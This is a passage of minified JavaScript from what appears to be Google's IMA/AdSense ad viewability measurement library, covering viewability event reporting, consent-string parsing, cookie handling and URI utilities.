        var b = gq.prototype.g.call(this, a);
        var c = Nq = Ya();
        var d = Sq(5);
        c = (Pq ? !d : d) ? c | 2 : c & -3;
        d = Sq(2);
        c = (Qq ? !d : d) ? c | 8 : c & -9;
        c = {
            s1: (c >>> 0).toString(16)
        };
        this.h || (this.h = Xq());
        b.B = this.h;
        b.A = fq(a, Lp, c, "h", br("kArwaWEsTs"));
        b.o = fq(a, Np, {}, "h", br("b96YPMzfnx"));
        b.h = fq(a, Op, {}, "h", br("yb8Wev6QDg"));
        return b
    };
    var br = function(a) {
        return function(b) {
            var c = new Yq;
            $q(c, b + a);
            var d = Array((56 > c.h ? c.blockSize : 2 * c.blockSize) - c.h);
            d[0] = 128;
            for (b = 1; b < d.length - 8; ++b) d[b] = 0;
            var e = 8 * c.l;
            for (b = d.length - 8; b < d.length; ++b) d[b] = e & 255, e /= 256;
            $q(c, d);
            d = Array(16);
            for (b = e = 0; 4 > b; ++b)
                for (var f = 0; 32 > f; f += 8) d[e++] = c.g[b] >>> f & 255;
            return gb(d).slice(-8)
        }
    };
    var cr = function(a, b) {
        this.l = a;
        this.o = b
    };
    cr.prototype.report = function(a, b) {
        var c = this.g(b);
        if ("function" === typeof c) {
            var d = {};
            d = (d.sv = Sp, d.cb = Rp, d.e = dr(a), d);
            var e = Ho(b, a, Sm());
            Xb(d, e);
            b.Qd[a] = e;
            d = 2 == b.va() ? on(d).join("&") : this.o.g(d).g;
            try {
                return c(b.ia, d, a), 0
            } catch (f) {
                return 2
            }
        } else return 1
    };
    var dr = function(a) {
        var b = Vp(a) ? "custom_metric_viewable" : a;
        a = Rb(function(c) {
            return c == b
        });
        return xm[a]
    };
    cr.prototype.g = function() {
        return Ka(this.l)
    };
    var er = function(a, b, c) {
        cr.call(this, a, b);
        this.h = c
    };
    t(er, cr);
    er.prototype.g = function(a) {
        if (!a.Ta) return cr.prototype.g.call(this, a);
        if (this.h[a.Ta]) return function() {};
        im(393, Error());
        return null
    };
    var fr = function() {
        xq.call(this);
        this.D = void 0;
        this.G = null;
        this.L = !1;
        this.B = {};
        this.J = 0;
        this.o = new ar
    };
    t(fr, xq);
    fr.prototype.I = function(a, b) {
        var c = this,
            d = G(bp);
        if (null != d.g) switch (d.g.getName()) {
            case "nis":
                var e = gr(this, a, b);
                break;
            case "gsv":
                e = hr(this, a, b);
                break;
            case "exc":
                e = ir(this, a)
        }
        e || (b.opt_overlayAdElement ? e = void 0 : b.opt_adElement && (e = Kq(this, a, b.opt_adElement, b.opt_osdId)));
        e && 1 == e.va() && (e.D == La && (e.D = function(f) {
            return c.fd(f)
        }), jr(this, e, b));
        return e
    };
    var jr = function(a, b, c) {
        c = c.opt_configurable_tracking_events;
        null != a.h && Array.isArray(c) && Aq(a, c, b)
    };
    fr.prototype.fd = function(a) {
        a.h = 0;
        a.M = 0;
        if ("h" == a.B || "n" == a.B) {
            if (N().l) var b = Ka("ima.bridge.getVideoMetadata");
            else if (a.Ta && kr(this)) {
                var c = this.B[a.Ta];
                c ? b = function(e) {
                    return lr(c, e)
                } : null !== c && im(379, Error())
            } else b = Ka("ima.common.getVideoMetadata");
            if ("function" === typeof b) try {
                var d = b(a.ia)
            } catch (e) {
                a.h |= 4
            } else a.h |= 2
        } else if ("b" == a.B)
            if (b = Ka("ytads.bulleit.getVideoMetadata"), "function" === typeof b) try {
                d = b(a.ia)
            } catch (e) {
                a.h |= 4
            } else a.h |= 2;
            else if ("ml" == a.B)
            if (b = Ka("ima.common.getVideoMetadata"),
                "function" === typeof b) try {
                d = b(a.ia)
            } catch (e) {
                a.h |= 4
            } else a.h |= 2;
            else a.h |= 1;
        a.h || (void 0 === d ? a.h |= 8 : null === d ? a.h |= 16 : Tb(d) ? a.h |= 32 : null != d.errorCode && (a.M = d.errorCode, a.h |= 64));
        null == d && (d = {});
        Mq(d, a);
        Km(d.volume) && Km(this.D) && (d.volume *= this.D);
        return d
    };
    var hr = function(a, b, c) {
            var d = To(Wo, b);
            d || (d = c.opt_nativeTime || -1, d = yq(a, b, Fq(a), d), c.opt_osdId && (d.Ta = c.opt_osdId));
            return d
        },
        gr = function(a, b, c) {
            var d = To(Wo, b);
            d || (d = yq(a, b, "n", c.opt_nativeTime || -1));
            return d
        },
        ir = function(a, b) {
            var c = To(Wo, b);
            c || (c = yq(a, b, "h", -1));
            return c
        };
    fr.prototype.sd = function() {
        if (kr(this)) return new er("ima.common.triggerExternalActivityEvent", this.o, this.B);
        var a = mr(this);
        return null != a ? new cr(a, this.o) : null
    };
    var mr = function(a) {
        var b = N();
        switch (Fq(a)) {
            case "b":
                return "ytads.bulleit.triggerExternalActivityEvent";
            case "n":
                return "ima.bridge.triggerExternalActivityEvent";
            case "h":
                if (b.l) return "ima.bridge.triggerExternalActivityEvent";
            case "m":
            case "ml":
                return "ima.common.triggerExternalActivityEvent"
        }
        return null
    };
    fr.prototype.Qc = function(a) {
        !a.g && a.$a && Gq(this, a, "overlay_unmeasurable_impression") && (a.g = !0)
    };
    fr.prototype.Jd = function(a) {
        a.Md && (a.ab() ? Gq(this, a, "overlay_viewable_end_of_session_impression") : Gq(this, a, "overlay_unviewable_impression"), a.Md = !1)
    };
    var nr = function(a, b, c, d) {
        c = void 0 === c ? {} : c;
        var e = {};
        Xb(e, {
            opt_adElement: void 0,
            opt_fullscreen: void 0
        }, c);
        if (e.opt_bounds) return a.o.g(Up("ol", d));
        if (void 0 !== d)
            if (void 0 !== Tp(d))
                if (Ap) b = Up("ue", d);
                else if (Dq(a), "i" == zp) b = Up("i", d), b["if"] = 0;
        else if (b = a.I(b, e)) {
            b: {
                "i" == zp && (b.$a = !0, a.Rc(b));c = e.opt_fullscreen;void 0 !== c && Rn(b, !!c);
                var f;
                if (c = !O().h && !Nm()) Ll(),
                c = 0 === ih(Qe);
                if (f = c) {
                    switch (b.va()) {
                        case 1:
                            Hq(a, b, "pv");
                            break;
                        case 2:
                            a.Qc(b)
                    }
                    Eq("pv")
                }
                c = d.toLowerCase();
                if (f = !f) c: {
                    if (wl(N().U, "ssmol") && (f =
                            a.l, "loaded" === c)) break c;f = wb(um, c)
                }
                if (f && 0 == b.ea) {
                    "i" != zp && (qp.done = !1);
                    f = void 0 !== e ? e.opt_nativeTime : void 0;
                    nm = f = "number" === typeof f ? f : pm();
                    b.Ub = !0;
                    var g = Sm();
                    b.ea = 1;
                    b.ga = {};
                    b.ga.start = !1;
                    b.ga.firstquartile = !1;
                    b.ga.midpoint = !1;
                    b.ga.thirdquartile = !1;
                    b.ga.complete = !1;
                    b.ga.resume = !1;
                    b.ga.pause = !1;
                    b.ga.skip = !1;
                    b.ga.mute = !1;
                    b.ga.unmute = !1;
                    b.ga.viewable_impression = !1;
                    b.ga.measurable_impression = !1;
                    b.ga.fully_viewable_audible_half_duration_impression = !1;
                    b.ga.fullscreen = !1;
                    b.ga.exitfullscreen = !1;
                    b.yc = 0;
                    g || (b.ra().I = f);
                    tp(qp, [b], !g)
                }(f = b.gb[c]) && eo(b.fa, f);wb(vm, c) && !b.$a && b.bb && 0 != b.ea && (f = b.bb, f.g || (f.g = no(f, b)));
                switch (b.va()) {
                    case 1:
                        var h = Vp(c) ? a.M.custom_metric_viewable : a.M[c];
                        break;
                    case 2:
                        h = a.T[c]
                }
                if (h && (d = h.call(a, b, e, d), void 0 !== d)) {
                    e = Up(void 0, c);
                    Xb(e, d);
                    d = e;
                    break b
                }
                d = void 0
            }
            3 == b.ea && a.A(b);b = d
        }
        else b = Up("nf", d);
        else b = void 0;
        else Ap ? b = Up("ue") : (b = a.I(b, e)) ? (d = Up(), Xb(d, Go(b, !0, !1, !1)), b = d) : b = Up("nf");
        return "string" === typeof b ? a.o.g(void 0) : a.o.g(b)
    };
    fr.prototype.K = function(a) {
        this.l && 1 == a.va() && or(this, a)
    };
    fr.prototype.Rc = function(a) {
        this.l && 1 == a.va() && or(this, a)
    };
    var or = function(a, b) {
            var c;
            if (b.Ta && kr(a)) {
                var d = a.B[b.Ta];
                d ? c = function(f, g) {
                    pr(d, f, g)
                } : null !== d && im(379, Error())
            } else c = Ka("ima.common.triggerViewabilityMeasurementUpdate");
            if ("function" === typeof c) {
                var e = Bo(b);
                e.nativeVolume = a.D;
                c(b.ia, e)
            }
        },
        qr = function(a, b, c) {
            a.B[b] = c
        },
        kr = function(a) {
            return N().l || "h" != Fq(a) && "m" != Fq(a) ? !1 : 0 != a.J
        };
    fr.prototype.C = function(a, b, c, d) {
        a = xq.prototype.C.call(this, a, b, c, d);
        this.L && (b = this.G, null == a.o && (a.o = new Zn), b.g[a.ia] = a.o, a.o.B = Jo);
        return a
    };
    fr.prototype.A = function(a) {
        a && 1 == a.va() && this.L && delete this.G.g[a.ia];
        return xq.prototype.A.call(this, a)
    };
    var rr = function(a) {
            var b = {};
            return b.viewability = a.g, b.googleViewability = a.l, b.moatInit = a.B, b.moatViewability = a.A, b.integralAdsViewability = a.o, b.doubleVerifyViewability = a.h, b
        },
        sr = function(a, b, c) {
            c = void 0 === c ? {} : c;
            a = nr(G(fr), b, c, a);
            return rr(a)
        },
        tr = new dq;
    tr.B = "stopped";
    tr.g = "stopped";
    tr.l = "stopped";
    tr.A = "stopped";
    tr.o = "stopped";
    tr.h = "stopped";
    Object.freeze(tr);
    var ur = hm(193, sr, void 0, Jq);
    y("Goog_AdSense_Lidar_sendVastEvent", ur, void 0);
    var vr = hm(194, function(a, b) {
        b = void 0 === b ? {} : b;
        a = nr(G(fr), a, b);
        return rr(a)
    });
    y("Goog_AdSense_Lidar_getViewability", vr, void 0);
    var wr = hm(195, function() {
        return Ol()
    });
    y("Goog_AdSense_Lidar_getUrlSignalsArray", wr, void 0);
    var xr = hm(196, function() {
        return JSON.stringify(Ol())
    });
    y("Goog_AdSense_Lidar_getUrlSignalsList", xr, void 0);
    var zr = function(a) {
        B.call(this, a, -1, yr)
    };
    t(zr, B);
    var yr = [3];
    var Br = function(a) {
        B.call(this, a, -1, Ar)
    };
    t(Br, B);
    var Cr = function(a, b) {
            return Fe(a, 1, b)
        },
        Dr = function(a, b) {
            return Fe(a, 2, b)
        },
        Er = function(a, b) {
            return Fe(a, 3, b)
        },
        Fr = function(a, b) {
            Fe(a, 4, b)
        },
        Ar = [1, 2, 3, 4];
    var Gr = function(a) {
        B.call(this, a)
    };
    t(Gr, B);
    var Ir = function(a) {
        B.call(this, a, -1, Hr)
    };
    t(Ir, B);
    Ir.prototype.getVersion = function() {
        return Ce(this, 1, 0)
    };
    var Jr = function(a, b) {
            return Ge(a, 1, b, 0)
        },
        Kr = function(a, b) {
            return Le(a, 2, b)
        },
        Lr = function(a, b) {
            return Le(a, 3, b)
        },
        Mr = function(a, b) {
            return Ge(a, 4, b, 0)
        },
        Nr = function(a, b) {
            return Ge(a, 5, b, 0)
        },
        Or = function(a, b) {
            return Ge(a, 6, b, 0)
        },
        Pr = function(a, b) {
            return Ge(a, 7, b, "")
        },
        Qr = function(a, b) {
            return Ge(a, 8, b, 0)
        },
        Rr = function(a, b) {
            return Ge(a, 9, b, 0)
        },
        Sr = function(a, b) {
            return Ge(a, 10, b, !1)
        },
        Tr = function(a, b) {
            return Ge(a, 11, b, !1)
        },
        Ur = function(a, b) {
            return Fe(a, 12, b)
        },
        Vr = function(a, b) {
            return Fe(a, 13, b)
        },
        Wr = function(a, b) {
            return Fe(a,
                14, b)
        },
        Xr = function(a, b) {
            return Ge(a, 15, b, !1)
        },
        Yr = function(a, b) {
            return Ge(a, 16, b, "")
        },
        Zr = function(a, b) {
            return Fe(a, 17, b)
        },
        $r = function(a, b) {
            return Fe(a, 18, b)
        },
        as = function(a, b) {
            a.g || (a.g = {});
            b = b || [];
            for (var c = se([]), d = 0; d < b.length; d++) c[d] = Ke(b[d], !1);
            a.g[19] = b;
            return Ee(a, 19, c)
        },
        Hr = [12, 13, 14, 17, 18, 19];
    var bs = function(a) {
        B.call(this, a)
    };
    t(bs, B);
    var cs = "a".charCodeAt(),
        ds = Mb({
            pg: 0,
            og: 1,
            lg: 2,
            gg: 3,
            mg: 4,
            hg: 5,
            ng: 6,
            jg: 7,
            kg: 8,
            fg: 9,
            ig: 10
        }),
        es = Mb({
            rg: 0,
            sg: 1,
            qg: 2
        });
    var fs = function(a) {
            if (/[^01]/.test(a)) throw Error("Input bitstring " + a + " is malformed!");
            this.h = a;
            this.g = 0
        },
        hs = function(a) {
            a = gs(a, 36);
            var b = new Gr;
            b = Ge(b, 1, Math.floor(a / 10), 0);
            return Ge(b, 2, a % 10 * 1E8, 0)
        },
        is = function(a) {
            return String.fromCharCode(cs + gs(a, 6)) + String.fromCharCode(cs + gs(a, 6))
        },
        ls = function(a) {
            var b = gs(a, 16);
            return !0 === !!gs(a, 1) ? (a = js(a), a.forEach(function(c) {
                if (c > b) throw Error("ID " + c + " is past MaxVendorId " + b + "!");
            }), a) : ks(a, b)
        },
        ms = function(a) {
            for (var b = [], c = gs(a, 12); c--;) {
                var d = gs(a,
                        6),
                    e = gs(a, 2),
                    f = js(a),
                    g = b,
                    h = g.push,
                    k = new zr;
                d = Ge(k, 1, d, 0);
                e = Ge(d, 2, e, 0);
                f = Fe(e, 3, f);
                h.call(g, f)
            }
            return b
        },
        js = function(a) {
            for (var b = gs(a, 12), c = []; b--;) {
                var d = !0 === !!gs(a, 1),
                    e = gs(a, 16);
                if (d)
                    for (d = gs(a, 16); e <= d; e++) c.push(e);
                else c.push(e)
            }
            c.sort(function(f, g) {
                return f - g
            });
            return c
        },
        ks = function(a, b, c) {
            for (var d = [], e = 0; e < b; e++)
                if (gs(a, 1)) {
                    var f = e + 1;
                    if (c && -1 === c.indexOf(f)) throw Error("ID: " + f + " is outside of allowed values!");
                    d.push(f)
                }
            return d
        },
        gs = function(a, b) {
            if (a.g + b > a.h.length) throw Error("Requested length " +
                b + " is past end of string.");
            var c = a.h.substring(a.g, a.g + b);
            a.g += b;
            return parseInt(c, 2)
        };
    fs.prototype.skip = function(a) {
        this.g += a
    };
    var ns = function(a) {
        try {
            var b = be(a).map(function(f) {
                    return f.toString(2).padStart(8, "0")
                }).join(""),
                c = new fs(b);
            if (3 !== gs(c, 3)) return null;
            var d = Dr(Cr(new Br, ks(c, 24, ds)), ks(c, 24, ds)),
                e = gs(c, 6);
            0 !== e && Fr(Er(d, ks(c, e)), ks(c, e));
            return d
        } catch (f) {
            return null
        }
    };
    var os = function(a) {
        try {
            var b = be(a).map(function(d) {
                    return d.toString(2).padStart(8, "0")
                }).join(""),
                c = new fs(b);
            return as($r(Zr(Yr(Xr(Wr(Vr(Ur(Tr(Sr(Rr(Qr(Pr(Or(Nr(Mr(Lr(Kr(Jr(new Ir, gs(c, 6)), hs(c)), hs(c)), gs(c, 12)), gs(c, 12)), gs(c, 6)), is(c)), gs(c, 12)), gs(c, 6)), !!gs(c, 1)), !!gs(c, 1)), ks(c, 12, es)), ks(c, 24, ds)), ks(c, 24, ds)), !!gs(c, 1)), is(c)), ls(c)), ls(c)), ms(c))
        } catch (d) {
            return null
        }
    };
    var qs = function(a) {
            if (!a) return null;
            var b = a.split(".");
            if (4 < b.length) return null;
            a = os(b[0]);
            if (!a) return null;
            var c = new bs;
            a = Le(c, 1, a);
            b.shift();
            b = q(b);
            for (c = b.next(); !c.done; c = b.next()) switch (c = c.value, ps(c)) {
                case 1:
                case 2:
                    break;
                case 3:
                    c = ns(c);
                    if (!c) return null;
                    Le(a, 2, c);
                    break;
                default:
                    return null
            }
            return a
        },
        ps = function(a) {
            try {
                var b = be(a).map(function(c) {
                    return c.toString(2).padStart(8, "0")
                }).join("");
                return gs(new fs(b), 3)
            } catch (c) {
                return -1
            }
        };
    var rs = function(a, b) {
        var c = {};
        if (Array.isArray(b) && 0 !== b.length) {
            b = q(b);
            for (var d = b.next(); !d.done; d = b.next()) d = d.value, c[d] = -1 !== a.indexOf(d)
        } else
            for (a = q(a), d = a.next(); !d.done; d = a.next()) c[d.value] = !0;
        delete c[0];
        return c
    };
    var us = function(a) {
        B.call(this, a, -1, ts)
    };
    t(us, B);
    var ts = [6];
    var vs = function(a) {
        B.call(this, a)
    };
    t(vs, B);
    var ws = function(a) {
        B.call(this, a)
    };
    t(ws, B);
    var xs = function(a) {
        this.g = a || {
            cookie: ""
        }
    };
    l = xs.prototype;
    l.set = function(a, b, c) {
        var d = !1;
        if ("object" === typeof c) {
            var e = c.xh;
            d = c.lf || !1;
            var f = c.domain || void 0;
            var g = c.path || void 0;
            var h = c.Ed
        }
        if (/[;=\s]/.test(a)) throw Error('Invalid cookie name "' + a + '"');
        if (/[;\r\n]/.test(b)) throw Error('Invalid cookie value "' + b + '"');
        void 0 === h && (h = -1);
        this.g.cookie = a + "=" + b + (f ? ";domain=" + f : "") + (g ? ";path=" + g : "") + (0 > h ? "" : 0 == h ? ";expires=" + (new Date(1970, 1, 1)).toUTCString() : ";expires=" + (new Date(Date.now() + 1E3 * h)).toUTCString()) + (d ? ";secure" : "") + (null != e ? ";samesite=" + e : "")
    };
    l.get = function(a, b) {
        for (var c = a + "=", d = (this.g.cookie || "").split(";"), e = 0, f; e < d.length; e++) {
            f = kc(d[e]);
            if (0 == f.lastIndexOf(c, 0)) return f.substr(c.length);
            if (f == a) return ""
        }
        return b
    };
    l.remove = function(a, b, c) {
        var d = void 0 !== this.get(a);
        this.set(a, "", {
            Ed: 0,
            path: b,
            domain: c
        });
        return d
    };
    l.Xa = function() {
        return ys(this).keys
    };
    l.Na = function() {
        return ys(this).values
    };
    l.isEmpty = function() {
        return !this.g.cookie
    };
    l.clear = function() {
        for (var a = ys(this).keys, b = a.length - 1; 0 <= b; b--) this.remove(a[b])
    };
    var ys = function(a) {
        a = (a.g.cookie || "").split(";");
        for (var b = [], c = [], d, e, f = 0; f < a.length; f++) e = kc(a[f]), d = e.indexOf("="), -1 == d ? (b.push(""), c.push(e)) : (b.push(e.substring(0, d)), c.push(e.substring(d + 1)));
        return {
            keys: b,
            values: c
        }
    };

    function zs(a) {
        return (a = (new xs(a)).get("DATA_USE_CONSENT", "")) ? a : null
    }

    function As(a) {
        var b = (b = (new xs(a)).get("FCCDCF", "")) ? b : null;
        try {
            var c = b ? xe(vs, b ? JSON.parse(b) : null) : null
        } catch (d) {
            c = null
        }
        if (!c) return zs(a);
        c = Ie(c, ws, 3);
        if (!c || null == C(c, 1)) return zs(a);
        a = C(c, 2);
        b = Date.now();
        if (a) {
            if (b < a || b > a + 33696E6) return null
        } else return null;
        return C(c, 1)
    };
    var Cs = function(a) {
        B.call(this, a, -1, Bs)
    };
    t(Cs, B);
    var Bs = [1, 2, 3, 4];
    var Ds = /^((market|itms|intent|itms-appss):\/\/)/i;
    var Es = function(a, b) {
        this.h = a[u.Symbol.iterator]();
        this.l = b;
        this.o = 0
    };
    Es.prototype[Symbol.iterator] = function() {
        return this
    };
    Es.prototype.next = function() {
        var a = this.h.next();
        return {
            value: a.done ? void 0 : this.l.call(void 0, a.value, this.o++),
            done: a.done
        }
    };
    var Fs = function(a, b) {
        return new Es(a, b)
    };
    var Ks = function(a) {
            if (a instanceof Gs || a instanceof Hs || a instanceof Is) return a;
            if ("function" == typeof a.next) return new Gs(function() {
                return Js(a)
            });
            if ("function" == typeof a[Symbol.iterator]) return new Gs(function() {
                return a[Symbol.iterator]()
            });
            if ("function" == typeof a.lb) return new Gs(function() {
                return Js(a.lb())
            });
            throw Error("Not an iterator or iterable.");
        },
        Js = function(a) {
            if (!(a instanceof Yn)) return a;
            var b = !1;
            return {
                next: function() {
                    for (var c; !b;) try {
                        c = a.g();
                        break
                    } catch (d) {
                        if (d !== Xn) throw d;
                        b = !0
                    }
                    return {
                        value: c,
                        done: b
                    }
                }
            }
        },
        Gs = function(a) {
            this.h = a
        };
    Gs.prototype.lb = function() {
        return new Hs(this.h())
    };
    Gs.prototype[Symbol.iterator] = function() {
        return new Is(this.h())
    };
    Gs.prototype.l = function() {
        return new Is(this.h())
    };
    var Hs = function(a) {
        this.h = a
    };
    t(Hs, Yn);
    Hs.prototype.g = function() {
        var a = this.h.next();
        if (a.done) throw Xn;
        return a.value
    };
    Hs.prototype.next = function() {
        return Hs.prototype.g.call(this)
    };
    Hs.prototype[Symbol.iterator] = function() {
        return new Is(this.h)
    };
    Hs.prototype.l = function() {
        return new Is(this.h)
    };
    var Is = function(a) {
        Gs.call(this, function() {
            return a
        });
        this.o = a
    };
    t(Is, Gs);
    Is.prototype.next = function() {
        return this.o.next()
    };
    var Ls = function(a, b) {
        this.h = {};
        this.g = [];
        this.l = this.size = 0;
        var c = arguments.length;
        if (1 < c) {
            if (c % 2) throw Error("Uneven number of arguments");
            for (var d = 0; d < c; d += 2) this.set(arguments[d], arguments[d + 1])
        } else if (a)
            if (a instanceof Ls)
                for (c = a.Xa(), d = 0; d < c.length; d++) this.set(c[d], a.get(c[d]));
            else
                for (d in a) this.set(d, a[d])
    };
    l = Ls.prototype;
    l.Na = function() {
        Ms(this);
        for (var a = [], b = 0; b < this.g.length; b++) a.push(this.h[this.g[b]]);
        return a
    };
    l.Xa = function() {
        Ms(this);
        return this.g.concat()
    };
    l.has = function(a) {
        return Ns(this.h, a)
    };
    l.isEmpty = function() {
        return 0 == this.size
    };
    l.clear = function() {
        this.h = {};
        this.l = this.size = this.g.length = 0
    };
    l.remove = function(a) {
        return Os(this, a)
    };
    var Os = function(a, b) {
            return Ns(a.h, b) ? (delete a.h[b], --a.size, a.l++, a.g.length > 2 * a.size && Ms(a), !0) : !1
        },
        Ms = function(a) {
            if (a.size != a.g.length) {
                for (var b = 0, c = 0; b < a.g.length;) {
                    var d = a.g[b];
                    Ns(a.h, d) && (a.g[c++] = d);
                    b++
                }
                a.g.length = c
            }
            if (a.size != a.g.length) {
                var e = {};
                for (c = b = 0; b < a.g.length;) d = a.g[b], Ns(e, d) || (a.g[c++] = d, e[d] = 1), b++;
                a.g.length = c
            }
        };
    l = Ls.prototype;
    l.get = function(a, b) {
        return Ns(this.h, a) ? this.h[a] : b
    };
    l.set = function(a, b) {
        Ns(this.h, a) || (this.size += 1, this.g.push(a), this.l++);
        this.h[a] = b
    };
    l.forEach = function(a, b) {
        for (var c = this.Xa(), d = 0; d < c.length; d++) {
            var e = c[d],
                f = this.get(e);
            a.call(b, f, e, this)
        }
    };
    l.keys = function() {
        return Ks(this.lb(!0)).l()
    };
    l.values = function() {
        return Ks(this.lb(!1)).l()
    };
    l.entries = function() {
        var a = this;
        return Fs(this.keys(), function(b) {
            return [b, a.get(b)]
        })
    };
    l.lb = function(a) {
        Ms(this);
        var b = 0,
            c = this.l,
            d = this,
            e = new Yn;
        e.g = function() {
            if (c != d.l) throw Error("The map has changed since the iterator was created");
            if (b >= d.g.length) throw Xn;
            var f = d.g[b++];
            return a ? f : d.h[f]
        };
        e.next = e.g.bind(e);
        return e
    };
    var Ns = function(a, b) {
        return Object.prototype.hasOwnProperty.call(a, b)
    };
    var P = function(a, b) {
        this.h = this.A = this.o = "";
        this.I = null;
        this.L = this.g = "";
        this.B = !1;
        var c;
        a instanceof P ? (this.B = void 0 !== b ? b : a.B, Ps(this, a.o), this.A = a.A, this.h = a.h, Qs(this, a.I), this.g = a.g, Rs(this, Ss(a.l)), this.L = a.D()) : a && (c = String(a).match(Ff)) ? (this.B = !!b, Ps(this, c[1] || "", !0), this.A = Ts(c[2] || ""), this.h = Ts(c[3] || "", !0), Qs(this, c[4]), this.g = Ts(c[5] || "", !0), Rs(this, c[6] || "", !0), this.L = Ts(c[7] || "")) : (this.B = !!b, this.l = new Us(null, this.B))
    };
    P.prototype.toString = function() {
        var a = [],
            b = this.o;
        b && a.push(Vs(b, Ws, !0), ":");
        var c = this.h;
        if (c || "file" == b) a.push("//"), (b = this.A) && a.push(Vs(b, Ws, !0), "@"), a.push(encodeURIComponent(String(c)).replace(/%25([0-9a-fA-F]{2})/g, "%$1")), c = this.I, null != c && a.push(":", String(c));
        if (c = this.g) this.h && "/" != c.charAt(0) && a.push("/"), a.push(Vs(c, "/" == c.charAt(0) ? Xs : Ys, !0));
        (c = this.l.toString()) && a.push("?", c);
        (c = this.D()) && a.push("#", Vs(c, Zs));
        return a.join("")
    };
    P.prototype.resolve = function(a) {
        var b = this.G(),
            c = !!a.o;
        c ? Ps(b, a.o) : c = !!a.A;
        c ? b.A = a.A : c = !!a.h;
        c ? b.h = a.h : c = null != a.I;
        var d = a.g;
        if (c) Qs(b, a.I);
        else if (c = !!a.g) {
            if ("/" != d.charAt(0))
                if (this.h && !this.g) d = "/" + d;
                else {
                    var e = b.g.lastIndexOf("/"); - 1 != e && (d = b.g.substr(0, e + 1) + d)
                }
            e = d;
            if (".." == e || "." == e) d = "";
            else if (-1 != e.indexOf("./") || -1 != e.indexOf("/.")) {
                d = 0 == e.lastIndexOf("/", 0);
                e = e.split("/");
                for (var f = [], g = 0; g < e.length;) {
                    var h = e[g++];
                    "." == h ? d && g == e.length && f.push("") : ".." == h ? ((1 < f.length || 1 == f.length && "" !=
                        f[0]) && f.pop(), d && g == e.length && f.push("")) : (f.push(h), d = !0)
                }
                d = f.join("/")
            } else d = e
        }
        c ? b.g = d : c = "" !== a.l.toString();
        c ? Rs(b, Ss(a.l)) : c = !!a.L;
        c && (b.L = a.D());
        return b
    };
    P.prototype.G = function() {
        return new P(this)
    };
    var Ps = function(a, b, c) {
            a.o = c ? Ts(b, !0) : b;
            a.o && (a.o = a.o.replace(/:$/, ""))
        },
        Qs = function(a, b) {
            if (b) {
                b = Number(b);
                if (isNaN(b) || 0 > b) throw Error("Bad port number " + b);
                a.I = b
            } else a.I = null
        },
        Rs = function(a, b, c) {
            b instanceof Us ? (a.l = b, $s(a.l, a.B)) : (c || (b = Vs(b, at)), a.l = new Us(b, a.B))
        },
        bt = function(a, b, c) {
            a.l.set(b, c);
            return a
        };
    P.prototype.D = function() {
        return this.L
    };
    var ct = function(a) {
            return a instanceof P ? a.G() : new P(a, void 0)
        },
        Ts = function(a, b) {
            return a ? b ? decodeURI(a.replace(/%25/g, "%2525")) : decodeURIComponent(a) : ""
        },
        Vs = function(a, b, c) {
            return "string" === typeof a ? (a = encodeURI(a).replace(b, dt), c && (a = a.replace(/%25([0-9a-fA-F]{2})/g, "%$1")), a) : null
        },
        dt = function(a) {
            a = a.charCodeAt(0);
            return "%" + (a >> 4 & 15).toString(16) + (a & 15).toString(16)
        },
        Ws = /[#\/\?@]/g,
        Ys = /[#\?:]/g,
        Xs = /[#\?]/g,
        at = /[#\?@]/g,
        Zs = /#/g,
        Us = function(a, b) {
            this.h = this.g = null;
            this.l = a || null;
            this.o = !!b
        },
        et = function(a) {
            a.g ||
                (a.g = new Ls, a.h = 0, a.l && Hf(a.l, function(b, c) {
                    a.add(Wc(b), c)
                }))
        };
    Us.prototype.add = function(a, b) {
        et(this);
        this.l = null;
        a = ft(this, a);
        var c = this.g.get(a);
        c || this.g.set(a, c = []);
        c.push(b);
        this.h += 1;
        return this
    };
    Us.prototype.remove = function(a) {
        et(this);
        a = ft(this, a);
        return this.g.has(a) ? (this.l = null, this.h -= this.g.get(a).length, this.g.remove(a)) : !1
    };
    Us.prototype.clear = function() {
        this.g = this.l = null;
        this.h = 0
    };
    Us.prototype.isEmpty = function() {
        et(this);
        return 0 == this.h
    };
    var gt = function(a, b) {
        et(a);
        b = ft(a, b);
        return a.g.has(b)
    };
    l = Us.prototype;
    l.forEach = function(a, b) {
        et(this);
        this.g.forEach(function(c, d) {
            c.forEach(function(e) {
                a.call(b, e, d, this)
            }, this)
        }, this)
    };
    l.Xa = function() {
        et(this);
        for (var a = this.g.Na(), b = this.g.Xa(), c = [], d = 0; d < b.length; d++)
            for (var e = a[d], f = 0; f < e.length; f++) c.push(b[d]);
        return c
    };
    l.Na = function(a) {
        et(this);
        var b = [];
        if ("string" === typeof a) gt(this, a) && (b = b.concat(this.g.get(ft(this, a))));
        else {
            a = this.g.Na();
            for (var c = 0; c < a.length; c++) b = b.concat(a[c])
        }
        return b
    };
    l.set = function(a, b) {
        et(this);
        this.l = null;
        a = ft(this, a);
        gt(this, a) && (this.h -= this.g.get(a).length);
        this.g.set(a, [b]);
        this.h += 1;
        return this
    };
    l.get = function(a, b) {
        if (!a) return b;
        a = this.Na(a);
        return 0 < a.length ? String(a[0]) : b
    };
    l.toString = function() {
        if (this.l) return this.l;
        if (!this.g) return "";
        for (var a = [], b = this.g.Xa(), c = 0; c < b.length; c++) {
            var d = b[c],
                e = encodeURIComponent(String(d));
            d = this.Na(d);
            for (var f = 0; f < d.length; f++) {
                var g = e;
                "" !== d[f] && (g += "=" + encodeURIComponent(String(d[f])));
                a.push(g)
            }
        }
        return this.l = a.join("&")
    };
    var Ss = function(a) {
            var b = new Us;
            b.l = a.l;
            a.g && (b.g = new Ls(a.g), b.h = a.h);
            return b
        },
        ft = function(a, b) {
            b = String(b);
            a.o && (b = b.toLowerCase());
            return b
        },
        $s = function(a, b) {
            b && !a.o && (et(a), a.l = null, a.g.forEach(function(c, d) {
                var e = d.toLowerCase();
                d != e && (this.remove(d), this.remove(e), 0 < c.length && (this.l = null, this.g.set(ft(this, e), Bb(c)), this.h += c.length))
            }, a));
            a.o = b
        };
    var ht = "://secure-...imrworldwide.com/ ://cdn.imrworldwide.com/ ://aksecure.imrworldwide.com/ ://[^.]*.moatads.com ://youtube[0-9]+.moatpixel.com ://pm.adsafeprotected.com/youtube ://pm.test-adsafeprotected.com/youtube ://e[0-9]+.yt.srs.doubleverify.com www.google.com/pagead/xsul www.youtube.com/pagead/slav".split(" "),
        it = /\bocr\b/,
        jt = 0,
        kt = {},
        lt = function(a) {
            if (jc(Zc(a))) return !1;
            if (0 <= a.indexOf("://pagead2.googlesyndication.com/pagead/gen_204?id=yt3p&sr=1&")) return !0;
            try {
                var b = new P(a)
            } catch (c) {
                return null !=
